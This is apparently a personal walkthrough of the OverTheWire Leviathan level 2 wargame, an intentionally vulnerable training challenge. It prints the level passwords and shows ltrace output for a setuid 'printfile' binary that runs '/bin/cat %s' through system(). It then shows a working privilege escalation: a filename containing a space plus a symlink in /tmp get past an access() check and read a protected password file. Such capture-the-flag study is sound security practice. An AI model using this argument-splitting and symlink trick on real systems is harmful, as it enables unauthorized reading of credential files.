Challenge page is <a href="http://www.overthewire.org/wargames/leviathan/leviathan2.shtml">HERE</a>

<<CHALLENGE_CONTENT
Level 2

There is no information for this level.
If you would like to see the description of this level expanded, please consider to contribute to OTW!
CHALLENGE_CONTENT

Login
	Username: leviathan2
	Password: ougahZi8Ta

Comment by me:
	- There is the file 'printfile' in home directory
	- From using command 'strings ~/printfile', it seems to use command '/bin/cat %s' to print out the file
	- Although the program has suid bit set as 'leviathan3' and the file we are looking (/etc/leviathan_pass/leviathan3) has permission as -r-------- (leviathan3:leviathan3), it cannot read the file.
	- Maybe because of the program has euid=leviathan3, but doesnot setuid=leviathan3 yet
	- leviathan3:x:12003:12003:leviathan level 3:/home/leviathan3:/bin/bash

	- a method call at this
	0x0804853a <+102>:	call   0x80483c4 <access@plt>
	- with ltrace, I can see clearly how it runs, and fails:
	
		$ ltrace ./printfile /etc/leviathan_pass/leviathan3
		__libc_start_main(0x80484d4, 2, -10268, 0x80485b0, 0x8048610 <unfinished ...>
		access("/etc/leviathan_pass/leviathan3", 4)                  = -1
		puts("You cant have that file..."You cant have that file...
		)                           = 27
		+++ exited (status 1) +++

		$ ltrace ./printfile /etc/hosts
		__libc_start_main(0x80484d4, 2, -10252, 0x80485b0, 0x8048610 <unfinished ...>
		access("/etc/hosts", 4)                                      = 0
		snprintf("/bin/cat /etc/hosts", 511, "/bin/cat %s", "/etc/hosts") = 19
		system("/bin/cat /etc/hosts"127.0.0.1	localhost localhost.localdomain
		141.138.199.118	melissa.labs.overthewire.org
		141.138.202.88  irc.overthewire.org
		 <unfinished ...>
		--- SIGCHLD (Child exited) ---
		<... system resumed> )                                       = 0
		+++ exited (status 0) +++

	- This solution is from http://mozcode.blogspot.com/2012/07/leviathan-level-2-walkthrough.html, my thanks to MozCode

		leviathan2@melissa:~$ ls
		printfile
		leviathan2@melissa:~$ ./printfile /etc/leviathan_pass/leviathan3
		You cant have that file...
		leviathan2@melissa:~$ echo "abcdef" > /tmp/"anidear1 anidear2"
		leviathan2@melissa:~$ cat /tmp/"anidear1 anidear2"
		abcdef
		leviathan2@melissa:~$ ./printfile "/tmp/anidear1 anidear2"
		/bin/cat: /tmp/anidear1: No such file or directory
		/bin/cat: anidear2: No such file or directory
		leviathan2@melissa:~$ cd /tmp
		leviathan2@melissa:/tmp$ ln -s /etc/leviathan_pass/leviathan3 anidear2
		leviathan2@melissa:/tmp$ ~/printfile "/tmp/anidear1 anidear2"
		/bin/cat: /tmp/anidear1: No such file or directory
		Ahdiemoo1j
		leviathan2@melissa:/tmp$
